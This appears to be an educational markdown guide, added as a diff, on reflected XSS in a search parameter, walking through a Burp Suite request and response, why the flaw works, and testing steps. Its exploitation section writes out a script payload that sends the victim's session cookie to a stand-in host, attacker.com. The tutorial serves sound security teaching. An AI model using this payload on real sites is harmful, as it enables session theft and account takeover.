@@ -1,0 +1,195 @@
+# Reflected XSS - Burp Suite HTTP Request/Response Example
+
+## Scenario
+A web application has a search functionality that reflects the search term directly in the response without proper encoding, resulting in reflected XSS.
+
+---
+
+## HTTP Request
+
+```http
+GET /search?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E HTTP/1.1
+Host: vulnerable-app.example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
+Upgrade-Insecure-Requests: 1
+```
+
+### Line-by-Line Explanation:
+
+**Line 1**: `GET /search?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E HTTP/1.1`
+- HTTP method: GET
+- Endpoint: `/search`
+- Parameter: `q` contains URL-encoded XSS payload: `<script>alert('XSS')</script>`
+- URL encoding breakdown:
+  - `%3C` = `<`
+  - `%3E` = `>`
+  - `%28` = `(`
+  - `%29` = `)`
+  - `%27` = `'`
+  - `%2F` = `/`
+
+**Line 2**: `Host: vulnerable-app.example.com`
+- Target hostname where the vulnerable application is hosted
+
+**Line 3**: `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36`
+- Browser identification string
+- Can also be an injection point for XSS in some applications
+
+**Line 4-6**: Standard HTTP headers
+- Accept headers indicate expected response formats
+- Accept-Encoding: tells server compression methods the client supports
+
+**Line 7**: `Connection: close`
+- Indicates the connection should be closed after the response
+
+**Line 8**: `Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`
+- Session cookie that could be stolen via XSS
+- JWT token that authenticates the user
+
+**Line 9**: `Upgrade-Insecure-Requests: 1`
+- Browser preference to upgrade to HTTPS
+
+---
+
+## HTTP Response
+
+```http
+HTTP/1.1 200 OK
+Date: Sun, 12 Oct 2025 20:15:32 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Content-Type: text/html; charset=UTF-8
+Content-Length: 1247
+Connection: close
+X-Powered-By: PHP/7.4.3
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Search Results</title>
+    <meta charset="UTF-8">
+</head>
+<body>
+    <h1>Search Results</h1>
+    <p>You searched for: <script>alert('XSS')</script></p>
+    <div class="results">
+        <p>No results found for your query.</p>
+    </div>
+</body>
+</html>
+```
+
+### Line-by-Line Explanation:
+
+**Line 1**: `HTTP/1.1 200 OK`
+- Status code 200 indicates successful request
+- The application processed the request and returned content
+
+**Line 2**: `Date: Sun, 12 Oct 2025 20:15:32 GMT`
+- Server timestamp of the response
+
+**Line 3**: `Server: Apache/2.4.41 (Ubuntu)`
+- Web server software and version (information disclosure)
+- Could be used for targeted attacks against known vulnerabilities
+
+**Line 4**: `Content-Type: text/html; charset=UTF-8`
+- Response is HTML content
+- Character encoding is UTF-8
+
+**Line 5**: `Content-Length: 1247`
+- Size of response body in bytes
+
+**Line 6**: `Connection: close`
+- Connection will be closed after response is sent
+
+**Line 7**: `X-Powered-By: PHP/7.4.3`
+- Technology stack information (PHP version)
+- Another information disclosure vector
+
+**Line 8-9**: Empty line separating headers from body
+
+**Lines 10-20**: HTML Response Body
+- **CRITICAL VULNERABILITY ON LINE 17**:
+  ```html
+  <p>You searched for: <script>alert('XSS')</script></p>
+  ```
+  - The search query is reflected directly into the HTML without encoding
+  - The `<script>` tags are rendered as executable JavaScript
+  - Browser executes: `alert('XSS')` showing a popup
+  - This proves JavaScript execution in the victim's browser context
+
+---
+
+## Exploitation Flow
+
+1. **Attacker crafts malicious URL**:
+   ```
+   https://vulnerable-app.example.com/search?q=<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
+   ```
+
+2. **Attacker sends URL to victim** (via email, message, social media)
+
+3. **Victim clicks the link** while authenticated to vulnerable-app.example.com
+
+4. **Victim's browser executes the script**:
+   - Reads the session cookie: `document.cookie`
+   - Sends it to attacker's server: `http://attacker.com/steal?cookie=...`
+
+5. **Attacker receives the cookie** and can now impersonate the victim
+
+---
+
+## Why This Works
+
+1. **No Input Validation**: Application accepts arbitrary characters in the `q` parameter
+2. **No Output Encoding**: User input is directly inserted into HTML without escaping:
+   - Should be: `&lt;script&gt;alert('XSS')&lt;/script&gt;`
+   - Actually is: `<script>alert('XSS')</script>`
+3. **No Content Security Policy (CSP)**: No CSP header to restrict script execution
+4. **Dangerous Context**: User input is placed directly in HTML body where scripts execute
+
+---
+
+## Testing with Burp Suite
+
+### Steps to reproduce:
+
+1. **Open Burp Suite** and configure browser proxy
+2. **Enable Intercept** in Proxy tab
+3. **Navigate to** `http://vulnerable-app.example.com/search?q=test`
+4. **Intercept the request** in Burp
+5. **Modify the `q` parameter**:
+   - Change `q=test` to `q=<script>alert('XSS')</script>`
+   - URL encode if needed: `q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E`
+6. **Forward the request**
+7. **Observe the response** in browser - alert popup confirms XSS
+8. **Send to Repeater** (Ctrl+R) for further testing
+9. **Test different payloads** to bypass filters
+
+---
+
+## Impact Assessment
+
+**Severity**: HIGH (CVSS 7.1)
+
+**Attack Scenario**:
+- Cookie/Session theft → Account takeover
+- Keylogging → Credential harvesting
+- Phishing → Injected fake login forms
+- Page defacement → Reputation damage
+
+---
+
+## References
+
+- [OWASP XSS Testing Guide](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting)
+- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
+- [Burp Suite Documentation](https://portswigger.net/burp/documentation)
+
+---
+
+**Ethical Reminder**: This example is for educational purposes only. Always obtain explicit written permission before testing for vulnerabilities.
